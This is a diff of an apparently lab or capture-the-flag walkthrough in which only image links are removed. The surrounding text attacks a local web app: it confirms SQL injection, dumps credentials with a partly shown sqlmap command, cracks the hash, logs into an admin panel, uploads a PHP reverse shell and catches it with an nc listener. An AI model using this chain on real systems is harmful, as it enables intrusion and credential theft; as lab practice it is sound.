@@ -189,7 +189,7 @@ What do you think after see the code ?, yes if you has do review the code before
 POC
 1. Confirm the SQL INJECTION is Valid, base url http://127.0.0.1/detail.php?id=1, try to add http://127.0.0.1/detail.php?id=1 AND 1=1, and see the below
 
-![[Pasted image 20241116150527.png]]
+
 
 Yes, we confirm that vuln SQLI, next using SQLMAP to dump credential or you can use the manual SQLI to.
 Finall payload :
@@ -200,7 +200,7 @@ sqlmap -u "http://localhost/detail.php?id=1" --batch --random-agent -D administr
 
 result
 
-![[Pasted image 20241116150732.png]]
+
 
 crack the hash, use : https://hashes.com/en/decrypt/hash
 
@@ -208,7 +208,7 @@ and you get the password.
 
 Login on port 8080 and /administrator
 
-![[Pasted image 20241116152434.png]]
+
 
 Try upload PHP REV SHELL, you can use : https://www.revshells.com/ and i use tes:tes:tes on filling the title, author and desc
 
@@ -220,7 +220,7 @@ nc -lnvp 9001
 
 success to upload but where the file so that we can trigger the rev shell. Notice in port 80 you can view detail produk
 
-![[Pasted image 20241116152657.png]]
+
 
 Click view details in tes.
 check the listener
